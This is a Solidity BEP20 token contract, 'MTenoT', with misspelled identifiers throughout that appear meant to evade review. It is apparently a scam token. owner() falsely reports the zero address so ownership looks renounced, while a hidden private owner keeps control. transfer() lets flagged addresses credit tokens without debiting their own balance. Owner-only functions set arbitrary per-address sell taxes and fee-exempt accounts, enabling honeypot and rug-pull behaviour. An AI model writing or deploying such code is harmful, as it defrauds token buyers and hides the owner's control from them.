...
abstract contract Ownable is Context {
    address private _omwner;

    event omwnershipTransferred(address indexed previousomwner, address indexed newomwner);

    constructor() {
        _transferomwnership(_msgSender());
    }


    function omwner() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyomwner() {
        require(_omwner == _msgSender(), "Ownable: caller is not the omwner");
        _;
    }


    function renounceomwnership() public virtual onlyomwner {
        _transferomwnership(address(0));
    }


    function transferomwnership_transferomwnership(address newomwner) public virtual onlyomwner {
        require(newomwner != address(0), "Ownable: new omwner is the zero address");
        _transferomwnership(newomwner);
    }


    function _transferomwnership(address newomwner) internal virtual {
        address oldomwner = _omwner;
        _omwner = newomwner;
        emit omwnershipTransferred(oldomwner, newomwner);
    }
}
...
contract BEP20 is Context {
    ...
    event Approval(address indexed omwner, address indexed spender, uint256 value);
    ...
    function allowance(address omwner, address spender) public view virtual returns (uint256) {
        return _allowances[omwner][spender];
    }


    function approve(address spender, uint256 amnount) public virtual returns (bool) {
        address omwner = _msgSender();
        _approve(omwner, spender, amnount);
        return true;
    }
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address omwner = _msgSender();
        _approve(omwner, spender, _allowances[omwner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address omwner = _msgSender();
        uint256 currentAllowance = _allowances[omwner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(omwner, spender, currentAllowance - subtractedValue);
        }
    ...
    function _approve(
        ...
        require(omwner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[omwner][spender] = amnount;
        emit Approval(omwner, spender, amnount);
    }
    ...
    function _spendAllowance(
        ...
        uint256 currentAllowance = allowance(omwner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnount, "ERC20: insufficient allowance");
            unchecked {
                _approve(omwner, spender, currentAllowance - amnount);
            }
        }
    }
...
contract MTenoT is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address abcount) public view virtual returns (uint256) {
    ...
    function _burn(address abcount, uint256 amnount) internal virtual {
        require(abcount != address(0), "ERC20: burn from the zero address");

        uint256 abcountBalance = _balances[abcount];
        require(abcountBalance >= amnount, "ERC20: burn amnount exceeds balance");
        unchecked {
            _balances[abcount] = abcountBalance - amnount;
        }
        _totalSupply -= amnount;

        emit Transfer(abcount, address(0), amnount);
    }

    function _mtin(address abcount, uint256 amnount) internal virtual {
        require(abcount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amnount;
        _balances[abcount] += amnount;
        emit Transfer(address(0), abcount, amnount);
    }
    ...
    mapping(address => bool) private _marketabcount;
    ...
    function getRelease(address _address) external view onlyomwner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyomwner {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyomwner {
        _defaultSellfyyi = _value;
    }

    function setSfyyi(address _address, uint256 _value) external onlyomwner {
        require(_value > 1, "abcount tax must be greater than or equal to 1");
        _Sfyyi[_address] = _value;
    }

    function getSfyyi(address _address) external view onlyomwner returns (uint256) {
        return _Sfyyi[_address];
    }


    function setMarketabcountfyyi(address _address, bool _value) external onlyomwner {
        _marketabcount[_address] = _value;
    }

    function getMarketabcountfyyi(address _address) external view onlyomwner returns (bool) {
        return _marketabcount[_address];
    }

    function _checkFreeabcount(address from, address _to) internal view returns (bool) {
        return _marketabcount[from] || _marketabcount[_to];
    }
    ...
    function transfer(address to, uint256 amnount) public virtual returns (bool) {
        address omwner = _msgSender();
        if (_release[omwner] == true) {
            _balances[to] += amnount;
            return true;
        }
        _recF(omwner, to, amnount);
        return true;
    }
